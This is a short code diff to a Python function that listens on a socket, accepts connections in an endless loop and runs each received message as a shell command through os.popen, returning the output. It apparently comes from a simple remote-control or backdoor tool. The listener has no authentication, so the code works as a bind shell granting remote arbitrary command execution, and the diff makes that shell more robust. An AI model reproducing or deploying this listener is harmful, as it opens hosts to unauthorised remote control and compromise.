@@ -29,22 +29,21 @@ def waitForConnections():
 		
 		try:
 			cnroot.bind((CLIENT_IP, CLIENT_PORT))
-			cnroot.listen(1)
+			cnroot.listen(10)
 
 		except socket.error as error:
 			exit(1)
 
 		message = ""
-		while ( message != "Finalize" ):
-			# TODO: HANDLE WHEN THE SERVER STOPS THE CONNECTION THEN IT STABLISHES IT AGAIN
-			
-			clientSock, ConnData = cnroot.accept()
-			heloMessage = clientSock.recv(1024).decode("utf-8")
-			message = clientSock.recv(1024).decode("utf-8")
+		while True:
 
+			clientSock, ConnData = cnroot.accept()
+			message = clientSock.recv(4096).decode("utf-8")
+			
 			if ( message != "Finalize" ):
 				output = os.popen(f"{message}").read()
 				clientSock.send(output.encode("utf-8"))
+				clientSock.close()
 			else:
 				clientSock.close()
 				
